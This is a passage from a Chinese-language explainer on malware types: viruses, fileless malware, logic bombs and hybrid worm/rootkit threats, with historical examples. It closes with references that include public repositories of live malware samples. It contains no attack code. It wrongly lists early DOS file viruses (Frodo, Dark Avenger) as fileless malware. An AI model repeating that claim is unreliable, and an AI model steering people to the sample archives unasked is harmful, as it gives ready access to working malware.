Slammer在 2016 年和 2017 年仍然死灰复燃。\n\n病毒病毒是一段代码，将自身插入应用程序并在应用程序运行时执行。一旦进入网络，病毒就可能被用来窃取敏感数据、发动 DDoS 攻击或进行勒索软件攻击。病毒通常通过受感染的网站、文件共享或电子邮件附件下载传播，在受感染的主机文件或程序被激活前处于休眠状态。一旦发生这种情况，病毒就可以自我复制并通过您的系统传播。病毒示例：\n\nStuxnet— Stuxnet出现在 2010 年，被广泛认为由美国和以色列政府开发，用来破坏伊朗的核计划。它通过 USB 驱动传播，针对西门子工业控制系统，导致离心机以创纪录的速度发生故障和自毁。据信 Stuxnet 感染了 20,000 多台计算机，摧毁了伊朗五分之一的核离心机，这使其计划退回到几年前。\n\n其他类型无文件恶意软件无文件恶意软件是一种使用合法程序感染计算机的恶意软件。它不依赖文件，也不留下足迹，这使得检测和删除富有挑战性。无文件恶意软件在 2017 年作为一种主流攻击类型出现，但其中许多攻击方法已经存在了一段时间。\n无文件感染不存储在文件中或直接安装在机器上，会直接进入内存，恶意内容永远不会触及硬盘驱动器。网络犯罪分子越来越多地将无文件恶意软件作为一种有效的替代攻击形式，这使得传统防病毒软件更难以检测到它，因为它占用空间小，没有要扫描的文件。\n无文件恶意软件示例：\n\nFrodo、Number Of The Beast 和 The Dark Avenger 都是这种恶意软件的早期例子。\n\n逻辑炸弹逻辑炸弹是一种恶意软件，只有在触发时才会激活，例如在特定日期和时间或第 20 次登录帐户。病毒和蠕虫通常包含逻辑炸弹，以便在预先定义的时间或满足其他条件时传递其有效载荷（即恶意代码）。逻辑炸弹造成的损害从改变几个字节的数据到使硬盘驱动器无法读取，不一而足。\n逻辑炸弹示例：\n\n2016 年，一位程序员 导致电子表格每隔几年在西门子公司的一个分支机构出现故障，所以他们只好不断雇用他来解决这个问题。在这种情况下，没有人怀疑任何事情，直到一次巧合迫使恶意代码公之于众。\n\n混合恶意软件今天，大多数恶意软件是不同类型的恶意软件的组合，通常包括部分特洛伊木马和蠕虫，偶尔还包括病毒。通常，恶意软件程序在最终用户看来是特洛伊木马，但一旦执行，它就会像蠕虫一样通过网络攻击其他受害者。\n混合恶意软件示例：\n\n2001 年，一位自称为”Lion”的恶意软件开发者发布了一种混合恶意软件：蠕虫&#x2F;rootkit组合。Rootkits允许黑客操纵操作系统文件，而蠕虫是快速传播代码段的强大载体。这种恶意组合造成了严重破坏：它对 10,000 多个Linux 系统造成了损害。蠕虫&#x2F;rootkit 组合恶意软件被明确设计为利用 Linux 系统中的漏洞。\nDridex:该恶意软件的目标是 Windows 用户，他们在 Word 或 Excel 中打开电子邮件附件 ，导致宏激活和下载 Dridex，感染计算机并使受害者面临银行盗窃。该软件的主要目标是从受感染机器的用户那里窃取银行信息,以立即启动欺诈交易。软件的 Bank 信息会安装键盘侦听器并执行注入攻击。\n\n参考资料https://www.kaspersky.com.cn/resource-center/definitions/what-is-ransomware-as-a-servicehttps://www.kaspersky.com.cn/resource-center/threats/types-of-malwarehttps://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkithttps://source.android.com/docs/core/permissions?hl=zh-cnhttps://bible.malcore.io/readme/the-beginning/introduction-to-malwareek:https://unit42.paloaltonetworks.com/unit42-understanding-angler-exploit-kit-part-1-exploit-kit-fundamentals/路过式下载:https://www.51cto.com/article/317226.html广告联盟:https://u.oppomobile.com/home/_book/%E5%90%88%E4%BD%9C%E6%B3%A8%E5%86%8C/%E5%90%88%E4%BD%9C%E6%B5%81%E7%A8%8B.html资源社区推荐，下载附件时请注意，它们可能会造成不可控的伤害https://github.com/ytisf/thezoohttps://virusshare.com/https://malwaretech.com/https://virus.exchange/sampleshttps://vx-underground.org/https://reverseengineering.meta.stackexchange.com/\n"}]